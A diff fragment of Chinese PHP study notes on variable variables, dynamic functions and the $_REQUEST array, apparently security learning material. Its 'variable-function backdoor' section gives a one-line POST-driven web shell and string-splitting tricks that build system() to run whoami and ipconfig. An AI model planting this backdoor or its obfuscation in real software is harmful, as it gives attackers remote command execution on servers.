+$a='b';
+$b='c';
+echo $$a;
+echo ${$a};  
+
+<?php
+$a='a';
+$b='b';
+$ab='cccc';
+echo ${$a.$b};
+
+动态函数
+1.动态执行函数
+<?php
+$a='phPinfo'; #php的函数忽略大小写，但是变量严格大小写，这样写没问题 而且直接调用PHpinfo也不会报错
+$a();
+2.动态实例化类
+<?php
+class cc{
+}
+$a='cc';
+new $a();
+3.可变函数后门
+<?php
+$_POST['1']($_POST['2']);
+<?php
+('sys'.'tem')('whoami');
+join("",["sys","tem"])("ipconfig");
+implode(['sys','tem'])("ipconfig");
+（7）深入理解_REQUEST数组
+print_r($_REQUEST['a']);
+这行代码会输出 $_REQUEST 数组中键为 'a' 的值。$_REQUEST 是一个包含了 $_GET、$_POST 和 $_COOKIE 数据的数组，默认情况下，它的顺序是先处理 $_POST，然后是 $_GET，最后是 $_COOKIE
